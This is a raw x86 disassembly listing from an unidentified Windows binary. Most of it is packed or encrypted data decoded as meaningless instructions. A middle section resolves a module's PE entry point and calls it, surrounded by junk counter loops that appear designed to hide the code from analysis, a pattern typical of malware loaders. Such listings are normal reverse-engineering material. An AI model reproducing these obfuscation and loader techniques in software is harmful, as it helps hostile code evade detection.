  411073:	cld    
  411074:	push   edx
  411075:	jg     0x41107d
  411077:	mov    DWORD PTR [eax-0x45876a4d],esi
  41107d:	aas    
  41107e:	loop   0x4110b3
  411080:	push   edx
  411081:	sbb    edx,DWORD PTR [edi+eiz*4-0x2a]
  411085:	mov    ebx,0x3d450fe6
  41108a:	add    DWORD PTR [edx+ebp*1-0x1f8bb1a2],0xffffff90
  411092:	outs   dx,DWORD PTR ds:[esi]
  411093:	aas    
  411094:	rcl    BYTE PTR ds:0x99bec1bf,cl
  41109a:	test   BYTE PTR [ebp+edi*2-0x30431134],dl
  4110a1:	sub    dl,BYTE PTR [esi-0x42]
  4110a4:	ss sub eax,0xf1bb0edb
  4110aa:	mov    esi,0x9873e958
  4110af:	ss add eax,0x74ab44a8
  4110b5:	cld    
  4110b6:	mov    bh,0x17
  4110b8:	btr    DWORD PTR [eax],edi
  4110bb:	into   
  4110bc:	or     DWORD PTR [ebx-0x1],ebx
  4110bf:	jg     0x4110ca
  4110c1:	and    al,0xa7
  4110c3:	dec    ebp
  4110c4:	iret   
  4110c5:	fstp   QWORD PTR ds:0x23b0cb3b
  4110cb:	inc    esp
  4110cc:	jae    0x41108d
  4110ce:	push   es
  4110cf:	(bad)  
  4110d0:	xchg   ebx,eax
  4110d1:	xor    esp,eax
  4110d3:	imul   edx,eax,0x57906926
  4110d9:	inc    BYTE PTR [ecx-0x56]
  4110dc:	sbb    DWORD PTR [edi+edi*4],0xffffff94
  4110e0:	leave  
  4110e1:	xchg   ecx,eax
  4110e2:	jecxz  0x41114f
  4110e4:	mov    ecx,DWORD PTR [ecx+0xb70a6c9]
  4110ea:	jmp    0x8e5866bd
  4110ef:	dec    eax
  4110f0:	ror    DWORD PTR [eax+ecx*8],1
  4110f3:	cmp    eax,0x3106dd01
  4110f8:	stos   BYTE PTR es:[edi],al
  4110f9:	mov    eax,DWORD PTR [esi]
  4110fb:	sbb    esi,DWORD PTR [edx-0x25]
  4110fe:	lea    esi,[ebx-0x35]
  411101:	xrelease mov BYTE PTR [edi-0x4561ef9a],bh
  411108:	nop
  411109:	or     cl,ch
  41110b:	dec    esi
  41110c:	xor    BYTE PTR [edi+0x23309e1],bh
  411112:	cmp    ebp,DWORD PTR [ebx+0x7d]
  411115:	out    0x92,al
  411117:	repz push es
  411119:	cwde   
  41111a:	cmp    DWORD PTR [ecx-0x9],esi
  41111d:	jmp    0xe892:0x26189ca0
  411124:	repz push ecx
  411126:	test   eax,0x9644a3e4
  41112b:	ins    BYTE PTR es:[edi],dx
  41112c:	mov    eax,0x77681313
  411131:	jecxz  0x4110cb
  411133:	les    esi,FWORD PTR [esi+0x152ad855]
  411139:	jno    0x411134
  41113b:	scas   al,BYTE PTR es:[edi]
  41113c:	inc    ecx
  41113d:	sbb    al,BYTE PTR [ebp+0x7a]
  411140:	jne    0x411107
  411142:	fptan  
  411144:	push   eax
  411145:	xlat   BYTE PTR ds:[ebx]
  411146:	or     DWORD PTR [ebx-0x69],edi
  411149:	lods   al,BYTE PTR ds:[esi]
  41114a:	mov    ?,ecx
  41114c:	fcomip st,st(5)
  41114e:	cwde   
  41114f:	push   cs
  411150:	imul   ebx,DWORD PTR [ecx+ebp*1],0x70f39784
  411157:	inc    ebp
  411158:	sub    al,0x18
  41115a:	iret   
  41115b:	cmp    al,0x50
  41115d:	xchg   ebx,eax
  41115e:	(bad)  
  41115f:	mov    ah,dl
  411161:	(bad)  
  411162:	arpl   si,dx
  411164:	mov    ebp,gs
  411166:	sbb    eax,0x6409f27
  41116b:	scas   eax,DWORD PTR es:[edi]
  41116c:	jbe    0x4111df
  41116e:	daa    
  41116f:	add    eax,0x9ea10d68
  411174:	fwait
  411175:	mov    ecx,0x588ac0e5
  41117a:	repnz lods al,BYTE PTR gs:[esi]
  41117d:	inc    eax
  41117e:	das    
  41117f:	dec    ebp
  411180:	inc    ebx
  411181:	mov    eax,ds
  411183:	inc    ebp
  411184:	cld    
  411185:	jecxz  0x4111bd
  411187:	fldenv [edi+0x1a]
  41118a:	rcr    DWORD PTR [ebx+0x5b],cl
  41118d:	push   ecx
  41118e:	fist   DWORD PTR [edi]
  411190:	icebp  
  411191:	(bad)  
  411192:	sbb    BYTE PTR [ecx],ch
  411194:	ins    BYTE PTR es:[edi],dx
  411195:	lods   eax,DWORD PTR ds:[esi]
  411196:	and    ch,BYTE PTR [ebx]
  411198:	add    al,0x32
  41119a:	icebp  
  41119b:	dec    ecx
  41119c:	lods   al,BYTE PTR ds:[esi]
  41119d:	or     DWORD PTR [esi+0x7307ae18],ebp
  4111a3:	inc    ebp
  4111a4:	sar    eax,1
  4111a6:	ds cs das 
  4111a9:	(bad)  
  4111aa:	ficom  DWORD PTR [ebx]
  4111ac:	xchg   ebx,eax
  4111ad:	mov    edi,esp
  4111af:	and    al,0xb7
  4111b1:	jl     0x4111d4
  4111b3:	xor    bh,al
  4111b5:	sub    cl,0x6c
  4111b8:	jmp    0x653010b9
  4111bd:	mov    edi,0xdaa4f50f
  4111c2:	xchg   DWORD PTR [ebx],ebp
  4111c4:	and    DWORD PTR [ebx+0x731bfdc0],ebp
  4111ca:	aas    
  4111cb:	xchg   edx,eax
  4111cc:	dec    ebp
  4111cd:	adc    BYTE PTR [ebx],0x45
  4111d0:	add    BYTE PTR [ebp-0x3bdca016],0x26
  4111d7:	or     BYTE PTR [eax-0x2edda0bd],bl
  4111dd:	mul    BYTE PTR [edi+eiz*1+0x6b991756]
  4111e4:	mov    cl,0xd3
  4111e6:	fsub   QWORD PTR gs:[ecx+ecx*1+0x2ca1a450]
  4111ee:	sbb    eax,0x9b7b5bd7
  4111f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111f4:	inc    edi
  4111f5:	jae    0x4111d6
  4111f7:	mov    eax,ds:0x4ab85ab0
  4111fc:	sub    DWORD PTR [eax+0x205508fa],esp
  411202:	stos   BYTE PTR es:[edi],al
  411203:	sbb    BYTE PTR [ecx-0x248e18ad],ch
  411209:	inc    ebx
  41120a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41120b:	out    0x91,eax
  41120d:	or     DWORD PTR [edx+edx*2+0x6cb3ead6],ebp
  411214:	jbe    0x4111e5
  411216:	in     eax,0x1
  411218:	xor    ebp,DWORD PTR [ebx]
  41121a:	into   
  41121b:	or     al,0x15
  41121d:	sub    BYTE PTR [esi],0x0
  411220:	stos   DWORD PTR es:[edi],eax
  411221:	pop    es
  411222:	push   0x32c26587
  411227:	(bad)  
  411228:	cwde   
  411229:	in     eax,dx
  41122a:	adc    eax,0x1b95176a
  41122f:	sbb    eax,0xf0ff9b82
  411234:	xchg   ebp,eax
  411235:	push   edx
  411236:	adc    eax,0x32b50a70
  41123b:	nop
  41123c:	outs   dx,DWORD PTR ds:[esi]
  41123d:	mov    edx,0x5ea9ba60
  411242:	ss pop edx
  411244:	sar    BYTE PTR [ebx+0x3e5f8741],0xf3
  41124b:	pop    ss
  41124c:	sbb    BYTE PTR [ebx],bh
  41124e:	popf   
  41124f:	std    
  411250:	add    ebx,DWORD PTR [ecx+eiz*2]
  411253:	push   ebp
  411254:	lods   al,BYTE PTR ds:[esi]
  411255:	push   eax
  411256:	xor    DWORD PTR ds:0xf368a35b,0x40
  41125d:	mov    ebx,0xc604a120
  411262:	mov    esp,edx
  411264:	out    0x16,eax
  411266:	xchg   BYTE PTR [edi+ebx*1+0x2a],bh
  41126a:	push   esp
  41126b:	mov    edx,0x5a1e60e6
  411270:	pop    es
  411271:	jo     0x411279
  411273:	and    dl,ah
  411275:	and    esi,ecx
  411277:	dec    eax
  411278:	stc    
  411279:	mov    eax,ds:0x5fe38546
  41127e:	dec    ebp
  41127f:	mov    ebx,0x56dc53c8
  411284:	int3   
  411285:	stos   BYTE PTR es:[edi],al
  411286:	mov    eax,0x1deb9ee4
  41128b:	cdq    
  41128c:	fnstsw WORD PTR [esi-0x653d1b19]
  411292:	sub    al,0x7f
  411294:	popf   
  411295:	cmc    
  411296:	cmp    eax,0xea2cefd9
  41129b:	fisubr WORD PTR [edi+ebp*2-0x5172e99a]
  4112a2:	scas   al,BYTE PTR es:[edi]
  4112a3:	test   BYTE PTR [edi+0x6340e2f5],bh
  4112a9:	mov    ah,0xc7
  4112ab:	ins    BYTE PTR es:[edi],dx
  4112ac:	fimul  DWORD PTR [eax]
  4112ae:	jmp    0x411263
  4112b0:	dec    edx
  4112b1:	mov    BYTE PTR [esi-0x3711e287],ch
  4112b7:	icebp  
  4112b8:	or     cl,BYTE PTR [edx+0x2c667e9e]
  4112be:	add    eax,0x9b389fe1
  4112c3:	repz test eax,0x541b476e
  4112c9:	jecxz  0x4112ce
  4112cb:	test   DWORD PTR [ecx-0x3aa5b2],esp
  4112d1:	fisub  DWORD PTR [edx-0x5ff72a5f]
  4112d7:	bswap  ebp
  4112d9:	les    eax,FWORD PTR [ecx-0x4b]
  4112dc:	pop    esi
  4112dd:	dec    edx
  4112de:	in     eax,dx
  4112df:	test   eax,0x5d561b68
  4112e4:	cmp    ah,dl
  4112e6:	xchg   esp,eax
  4112e7:	jl     0x411270
  4112e9:	xor    esi,eax
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434703
  411346:	xor    DWORD PTR ds:0x4346cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4345ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4345ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4345ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43487a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4345ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4345ff
  411399:	dec    eax
  41139a:	mov    ds:0x4345ff,eax
  41139f:	mov    eax,ds:0x4345ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4345ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4345ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434643,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434643
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434643,eax
  4113d6:	cmp    DWORD PTR ds:0x434643,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434643,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43467f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434643,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434643
  411418:	inc    eax
  411419:	mov    ds:0x434643,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43470f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43470f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43470f,ebx
  411442:	cmp    DWORD PTR ds:0x43470f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434693
  411457:	push   0x4347db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43470f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43470f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43470f,ebx
  41147c:	cmp    DWORD PTR ds:0x43470f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4345df
  411490:	adc    DWORD PTR ds:0x4346c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434683,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434703,0x4345e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4346d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4346f7,0x4345f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4346cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4345ff,0x43463f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434713,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4345ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4345ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4345ff,edi
  411509:	cmp    DWORD PTR ds:0x4345ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434707
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4345ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4345ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4345ff,edi
  411545:	cmp    DWORD PTR ds:0x4345ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4345e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4345f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4345f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4345f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4345f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4345f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4345f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4345f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4345f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4345eb
  4115c4:	adc    DWORD PTR ds:0x4345e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43470b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43470b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43470b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43470b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43470b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43470b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43470b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43470b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x41169d
  411641:	mov    al,0x22
  411643:	cwde   
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4115f5
  41164d:	mov    esp,fs
  41164f:	mov    ebx,0x85a3fda0
  411654:	mov    cl,bl
  411656:	pop    eax
  411657:	sbb    eax,0xba8e51fd
  41165c:	das    
  41165d:	inc    ebp
  41165e:	neg    BYTE PTR [eiz*1+0x7136f114]
  411665:	sbb    ebx,DWORD PTR [edi+0x88e7181]
  41166b:	mov    ch,0x39
  41166d:	(bad)  
  41166e:	sbb    BYTE PTR gs:[edx],ah
  411671:	or     al,0xd6
  411673:	cmp    eax,edx
  411675:	xchg   ecx,eax
  411676:	in     al,dx
  411677:	cli    
  411678:	or     al,BYTE PTR [ecx-0x338cef30]
  41167e:	sub    al,0x94
  411680:	ja     0x411671
  411682:	pop    ecx
  411683:	imul   esp,DWORD PTR [esi-0x6002a390],0xad181cd
  41168d:	push   esi
  41168e:	jecxz  0x411686
  411690:	jnp    0x41167d
  411692:	xor    eax,0xa26bbea
  411697:	lods   al,BYTE PTR ds:[esi]
  411698:	mov    cl,0x41
  41169a:	out    0x20,al
  41169c:	jnp    0x41165f
  41169e:	xor    eax,0xd55d3c45
  4116a3:	ja     0x411670
  4116a5:	fadd   st(0),st
  4116a7:	pop    esi
  4116a8:	cdq    
  4116a9:	dec    edx
  4116aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ab:	mov    BYTE PTR [eax],bh
  4116ad:	lods   al,BYTE PTR ds:[esi]
  4116ae:	jb     0x411658
  4116b0:	xor    edx,esp
  4116b2:	out    dx,eax
  4116b3:	jb     0x41169b
  4116b5:	adc    eax,0xc506f148
  4116ba:	add    ah,BYTE PTR [edx]
  4116bc:	mov    ds:0x21488866,al
  4116c1:	and    al,0x4f
  4116c3:	sbb    dh,dh
  4116c5:	sub    bl,BYTE PTR [edi+0x412bbdfd]
  4116cb:	(bad)  
  4116cc:	mov    ebp,0xd05e21e8
  4116d1:	mov    esi,0x1b9f951c
  4116d6:	mov    ch,0x71
  4116d8:	in     eax,dx
  4116d9:	pop    ecx
  4116da:	daa    
  4116db:	add    DWORD PTR ds:0x5eb0cf17,esi
  4116e1:	(bad)  
  4116e2:	pop    ecx
  4116e3:	jns    0x411711
  4116e5:	jmp    0xef6f:0xb02ea6d1
  4116ec:	(bad)  
  4116ed:	or     DWORD PTR [edi],esi
  4116ef:	jb     0x411684
  4116f1:	retf   0x7b06
  4116f4:	pop    ebx
  4116f5:	int3   
  4116f6:	cmc    
  4116f7:	mov    DWORD PTR [di-0x31],esp
  4116fb:	gs xchg edx,eax
  4116fd:	in     al,0x30
  4116ff:	imul   edx,DWORD PTR [eax+0x17084f98],0xffffffcb
  411706:	push   edx
  411707:	xor    bh,bh
  411709:	loopne 0x411772
  41170b:	cmp    cl,BYTE PTR [edi-0xe41c7ea]
  411711:	fwait
  411712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411713:	sbb    DWORD PTR [esp+eax*4+0x2f],eax
  411717:	and    DWORD PTR [edi+0x71f461bb],esi
  41171d:	mov    ah,0xde
  41171f:	jbe    0x4116f9
  411721:	inc    edi
  411722:	cmp    al,0xe0
  411724:	in     eax,dx
  411725:	cmp    eax,0x68cf615a
  41172a:	mov    bl,al
  41172c:	outs   dx,DWORD PTR ds:[esi]
  41172d:	mov    ds:0xc022c942,al
  411732:	sbb    BYTE PTR [edx-0x383642e7],cl
  411738:	das    
  411739:	mov    bl,0x4b
  41173b:	xor    al,0xc7
  41173d:	and    BYTE PTR ds:[esi],dl
  411740:	das    
  411741:	inc    edx
  411742:	fistp  QWORD PTR [ecx-0x57ff010]
  411748:	rcl    DWORD PTR [edi+0x6b],cl
  41174b:	pop    es
  41174c:	lahf   
  41174d:	and    BYTE PTR [ebx],ah
  41174f:	dec    esp
  411750:	add    BYTE PTR [ebx],0x2e
  411753:	xchg   esp,eax
  411754:	fs das 
  411756:	pop    edx
  411757:	mov    edi,0x9c5b659a
  41175c:	sbb    ebp,DWORD PTR [ecx]
  41175e:	int    0xad
  411760:	std    
  411761:	inc    ebx
  411762:	lods   al,BYTE PTR ds:[esi]
  411763:	mov    cl,0xb3
  411765:	jb     0x4116f0
  411767:	fsubrp st(4),st
  411769:	call   0x261e:0x9ebbc558
  411770:	inc    ecx
  411771:	xlat   BYTE PTR ds:[ebx]
  411772:	shl    DWORD PTR [esi-0x6b],0x5e
  411776:	rol    ecx,cl
  411778:	push   ds
  411779:	out    0xc4,eax
  41177b:	imul   esi,DWORD PTR [edi],0xc6c8ef2c
  411781:	mov    ecx,0xeba78027
  411786:	mov    dl,0xe6
  411788:	mov    eax,0xfddc766d
  41178d:	push   edx
  41178e:	fadd   DWORD PTR [edi]
  411790:	out    0x64,al
  411792:	mov    cl,0x1e
  411794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411795:	push   edx
  411796:	ins    DWORD PTR es:[edi],dx
  411797:	pop    edi
  411798:	push   eax
  411799:	push   esi
  41179a:	into   
  41179b:	test   eax,0x5f49e81
  4117a0:	push   es
  4117a1:	div    BYTE PTR [edx+0x7700e18b]
  4117a7:	out    0xf9,eax
  4117a9:	pop    ecx
  4117aa:	lock adc ebp,DWORD PTR ds:0xea993388
  4117b1:	push   0x5ec08958
  4117b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117b7:	push   cs
  4117b8:	int3   
  4117b9:	xlat   BYTE PTR ds:[ebx]
  4117ba:	int    0x53
  4117bc:	and    ecx,ebx
  4117be:	mul    dh
  4117c0:	sub    BYTE PTR [edi-0x14b00374],dl
  4117c6:	dec    edi
  4117c7:	cmp    ecx,DWORD PTR [esi]
  4117c9:	fld    TBYTE PTR [ebp-0x5e9723d4]
  4117cf:	xchg   ecx,eax
  4117d0:	std    
  4117d1:	in     al,0x98
  4117d3:	xchg   DWORD PTR [edi],edx
  4117d5:	loope  0x411794
  4117d7:	out    dx,al
  4117d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d9:	and    BYTE PTR ds:0x266c87b5,bl
  4117df:	shl    BYTE PTR [edi+0x5e64a90b],0x66
  4117e6:	or     BYTE PTR [edx+0x23554e71],0x94
  4117ed:	call   0x6996:0x61f45c12
  4117f4:	(bad)  
  4117f7:	pop    esi
  4117f8:	add    BYTE PTR [esi],bh
  4117fa:	xor    ebx,ebx
  4117fc:	sbb    edi,DWORD PTR [ecx]
  4117fe:	fstp   TBYTE PTR [ecx+ecx*8+0x38af0ea0]
  411805:	dec    ecx
  411806:	pop    edx
  411807:	(bad)
  41180a:	scas   eax,DWORD PTR es:[edi]
  41180b:	pop    edi
  41180c:	iret   
  41180d:	repz repz inc edx
  411810:	in     eax,0xf2
  411812:	jne    0x4117d9
  411814:	and    BYTE PTR [eax+0x29],0xa9
  411818:	xor    edx,DWORD PTR [edx]
  41181a:	call   0xdcbe:0x16714e2e
  411821:	retf   
  411822:	mov    dl,BYTE PTR [esi+0x9]
  411825:	adc    esp,DWORD PTR gs:[esi-0x67]
  411829:	pop    ebp
  41182a:	pop    eax
  41182b:	or     eax,0xbef22058
  411830:	jns    0x4118aa
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	xchg   ecx,eax
  411851:	dec    ebx
  411852:	in     eax,0x5b
  411854:	jmp    0x7e7f:0x597e7e54
  41185b:	jle    0x41181c
  41185d:	jecxz  0x4118b8
  41185f:	push   eax
  411860:	imul   ecx,DWORD PTR [eax-0x13ac0c76],0x50e43b8b
  41186a:	ret    
  41186b:	mov    cl,0x40
  41186d:	fadd   DWORD PTR [ecx+esi*1+0x57]
  411871:	loope  0x411817
  411873:	mov    eax,ds:0xac9ed10a
  411878:	cmc    
  411879:	inc    edi
  41187a:	push   es
  41187b:	repz shl DWORD PTR [edi+0x1af68fbb],1
  411882:	xchg   edi,eax
  411883:	xchg   ecx,eax
  411884:	out    dx,eax
  411885:	xchg   edi,eax
  411886:	push   ebp
  411887:	lods   al,BYTE PTR ds:[esi]
  411888:	loop   0x4118bc
  41188a:	and    eax,0x3d91b0a2
  41188f:	push   cs
  411890:	jge    0xf2ac400d
  411896:	arpl   ax,dx
  411898:	jecxz  0x4118f3
  41189a:	mov    cl,0x72
  41189c:	(bad)  
  41189d:	lods   eax,DWORD PTR ds:[esi]
  41189e:	xor    ah,BYTE PTR [edx]
  4118a0:	sub    cl,bh
  4118a2:	adc    al,0xcc
  4118a4:	adc    BYTE PTR [ebx],dh
  4118a6:	jecxz  0x4118be
  4118a8:	and    al,0xe0
  4118aa:	jae    0x4118bc
  4118ac:	push   0xbf4abd4b
  4118b1:	push   ecx
  4118b2:	sbb    dl,bh
  4118b4:	mov    eax,0x84d86aa0
  4118b9:	jae    0x411862
  4118bb:	xchg   esi,eax
  4118bc:	sti    
  4118bd:	out    0xc0,eax
  4118bf:	sub    ebp,ebp
  4118c1:	cmp    eax,0x623f9ef2
  4118c6:	dec    esi
  4118c7:	jbe    0x411858
  4118c9:	(bad)  
  4118ca:	ins    BYTE PTR es:[edi],dx
  4118cb:	add    eax,0xa768dc1d
  4118d0:	push   eax
  4118d1:	xor    al,0xc6
  4118d3:	ret    0x38ed
  4118d6:	lock in eax,dx
  4118d8:	scas   eax,DWORD PTR es:[edi]
  4118d9:	mov    DWORD PTR [eax+0x2194ab97],ecx
  4118df:	pushf  
  4118e0:	aad    0x67
  4118e2:	pop    ebp
  4118e3:	pop    ds
  4118e4:	loope  0x41186f
  4118e6:	mov    ecx,0x7e8213c7
  4118eb:	test   BYTE PTR [esi+0x2f6ace22],cl
  4118f1:	pop    es
  4118f2:	(bad)  
  4118f3:	jmp    0x8f17:0x1c2af7e1
  4118fa:	sub    dl,bh
  4118fc:	in     eax,0x7e
  4118fe:	cmp    eax,0xb8b53386
  411903:	call   0xf664:0x3b8cfa1c
  41190a:	repz (bad) 
  41190c:	mov    edx,edi
  41190e:	jl     0x41195b
  411910:	ins    DWORD PTR es:[edi],dx
  411911:	jb     0x4118b9
  411913:	neg    DWORD PTR [ecx]
  411915:	push   ecx
  411916:	imul   ecx,DWORD PTR [edi+0x1f],0xa5256835
  41191d:	rcr    esi,1
  41191f:	add    DWORD PTR [eax-0x5e],ecx
  411922:	aam    0x0
  411924:	xchg   ecx,eax
  411925:	jmp    0xffe0:0x80835be7
  41192c:	and    dl,BYTE PTR [edx]
  41192e:	add    esi,ecx
  411930:	pop    esi
  411931:	loope  0x411988
  411933:	jmp    0xcff3:0xc8c22245
  41193a:	cmp    BYTE PTR [eax+eax*4-0x45],0xc8
  41193f:	enter  0x8143,0xb4
  411943:	and    BYTE PTR [edi-0x25337ef4],dh
  411949:	outs   dx,DWORD PTR ds:[esi]
  41194a:	mov    dh,0xbc
  41194c:	shl    DWORD PTR [edx+0x472cd149],0xa8
  411953:	cmp    BYTE PTR [ecx-0x56],bh
  411956:	cli    
  411957:	or     al,0xf7
  411959:	rcl    cl,cl
  41195b:	ja     0x411919
  41195d:	iret   
  41195e:	add    eax,DWORD PTR [ecx-0x14]
  411961:	outs   dx,BYTE PTR ds:[esi]
  411962:	cmp    al,0x53
  411964:	jno    0x4119e5
  411966:	(bad)  
  411968:	pusha  
  411969:	cs xchg esp,eax
  41196b:	dec    edx
  41196c:	mov    ds:0x1674ca53,al
  411971:	ds mov ebp,0x876b5daf
  411977:	test   eax,0x2713c50a
  41197c:	sbb    BYTE PTR [eax+0x464eb664],al
  411982:	dec    ebp
  411983:	fsub   DWORD PTR [edi-0x75c5098f]
  411989:	inc    ebx
  41198a:	jmp    0x62cb:0x81226674
  411991:	xor    BYTE PTR [edi-0x734d817c],bh
  411997:	fadd   DWORD PTR [ebp-0x23]
  41199a:	push   ecx
  41199b:	push   eax
  41199c:	je     0x4119f1
  41199e:	dec    ecx
  41199f:	add    dl,ah
  4119a1:	and    eax,0x859efcfb
  4119a6:	test   al,0xc1
  4119a8:	mov    ch,0x6a
  4119aa:	dec    esp
  4119ab:	in     eax,dx
  4119ac:	cld    
  4119ad:	jmp    0x56ded528
  4119b2:	dec    edi
  4119b3:	push   esi
  4119b4:	dec    eax
  4119b6:	inc    edx
  4119b7:	sbb    esi,DWORD PTR [ebp-0x7c7f4612]
  4119bd:	adc    edx,DWORD PTR [esi+0x34d3a813]
  4119c3:	pusha  
  4119c4:	fsub   DWORD PTR [esi-0x4]
  4119c7:	aam    0xb8
  4119c9:	mov    ds:0xf5c1676e,al
  4119ce:	es cwde 
  4119d0:	mov    al,ds:0x534f28ca
  4119d5:	inc    edi
